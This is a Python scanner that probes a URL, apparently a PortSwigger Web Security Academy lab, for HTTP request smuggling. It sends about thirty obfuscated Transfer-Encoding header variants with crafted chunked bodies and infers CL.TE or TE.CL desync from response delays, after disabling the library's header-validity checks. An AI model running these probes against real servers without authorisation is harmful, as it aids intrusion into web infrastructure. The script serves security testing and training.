#!/usr/bin/python3
from requests import Request, Session
from requests.exceptions import ReadTimeout
import urllib3
import requests
import collections
import http.client

# close http header check
http.client._is_legal_header_name = lambda x: True
http.client._is_illegal_header_value = lambda x: False
urllib3.disable_warnings()


class HttpRequestSmuggler():

    def __init__(self, url):
        self.url = url
        self.payload_headers = []
        self.result_headers = []

    def generateHeaders(self):
        transfer_encoding = list(
            [
                ["Transfer-Encoding", "chunked"],
                ["Transfer-Encoding ", "chunked"],
                ["Transfer_Encoding", "chunked"],
                ["Transfer Encoding", "chunked"],
                [" Transfer-Encoding", "chunked"],
                ["Transfer-Encoding", "  chunked"],
                ["Transfer-Encoding", "chunked"],
                ["Transfer-Encoding", "\tchunked"],
                ["Transfer-Encoding", "\u000Bchunked"],
                ["Content-Encoding", " chunked"],
                ["Transfer-Encoding", "\n chunked"],
                ["Transfer-Encoding\n ", " chunked"],
                ["Transfer-Encoding", " \"chunked\""],
                ["Transfer-Encoding", " 'chunked'"],
                ["Transfer-Encoding", " \n\u000Bchunked"],
                ["Transfer-Encoding", " \n\tchunked"],
                ["Transfer-Encoding", " chunked, cow"],
                ["Transfer-Encoding", " cow, "],
                ["Transfer-Encoding", " chunked\r\nTransfer-encoding: cow"],
                ["Transfer-Encoding", " chunk"],
                ["Transfer-Encoding", " cHuNkeD"],
                ["TrAnSFer-EnCODinG", " cHuNkeD"],
                ["Transfer-Encoding", " CHUNKED"],
                ["TRANSFER-ENCODING", " CHUNKED"],
                ["Transfer-Encoding", " chunked\r"],
                ["Transfer-Encoding", " chunked\t"],
                ["Transfer-Encoding", " cow\r\nTransfer-Encoding: chunked"],
                ["Transfer-Encoding", " cow\r\nTransfer-Encoding: chunked"],
                ["Transfer\r-Encoding", " chunked"],
                ["barn\n\nTransfer-Encoding", " chunked"],
            ])
        for x in transfer_encoding:
            headers = collections.OrderedDict()
            headers[x[0]] = x[1]
            headers['Cache-Control'] = "no-cache"
            headers['Content-Type'] = "application/x-www-form-urlencoded"
            headers['User-Agent'] = "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)"
            self.payload_headers.append(headers)

    def getRespTime(self, headers={}, payload=""):
        s = Session()
        req = Request('POST', self.url, data=payload)
        prepped = req.prepare()
        prepped.headers = headers
        resp_time = 0
        try:
            resp = s.send(prepped, verify=False, timeout=10)
            resp_time = resp.elapsed.total_seconds()
            print(resp, resp_time)
        except Exception as e:
            if isinstance(e, ReadTimeout):
                resp_time = 10
                print("requests.exceptions.ReadTimeout")
        return resp_time

    def calcTime(self, length_big_time, payload_big_time, length_small_time, payload_small_time):
        # todo 判断self.payload_headers 不为空
        for headers in self.payload_headers:
            headers['Content-Length'] = length_big_time
            big_time = self.getRespTime(headers, payload_big_time)
            if not big_time:
                big_time = 0
            if big_time < 5:
                continue
            # Content-Length == 11
            headers['Content-Length'] = length_small_time
            small_time = self.getRespTime(headers, payload_small_time)
            if not small_time:
                small_time = 1
            if big_time > 5 and big_time / small_time >= 5:
                self.valid = True
                self.type = "CL-TE"
                self.result_headers = [headers]
                return True
        return False

    def basic_check(self):
        header = {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36"
        }
        try:
            resp = requests.get(self.url, headers=header, verify=False, timeout=10)
            if resp.status_code == 200:
                return True
            else:
                return False
        except Exception as error:
            print(error)

    def check_CLTE(self):
        result = self.calcTime(4, "1\r\nZ\r\nQ\r\n\r\n\r\n", 11, "1\r\nZ\r\nQ\r\n\r\n\r\n")
        return result

    def check_TECL(self):
        result = self.calcTime(6, "0\r\n\r\nX", 5, "0\r\n\r\n")
        return result

    def run(self):
        if self.basic_check():
            self.generateHeaders()
            try:
                result = self.check_CLTE()
                flag = "CLTE"
                if not result:
                    result = self.check_TECL()
                    flag = "TECL"
                if result:
                    print("[+]found vul" + flag)
                    self.recheck(flag)
            except Exception as e:
                print(e)
                print("timeout: " + self.url)
        else:
            print("[+]target can not access")

    def recheck(self, flag):
        print("[+]recheck")
        result = False
        if flag == "CLTE":
            result = self.check_CLTE()
        if flag == "TECL":
            result = self.check_TECL()
        if result:
            # 这里输出
            payload_key = list(self.result_headers[0])[0]
            payload_value = self.result_headers[0][payload_key]
            payload = str([payload_key, payload_value])
            print(flag, payload)

if __name__ == '__main__':
    target = "https://ac701f101fe6fd95801c50b100a200f8.web-security-academy.net/"
    hrs = HttpRequestSmuggler(target)
    hrs.run()
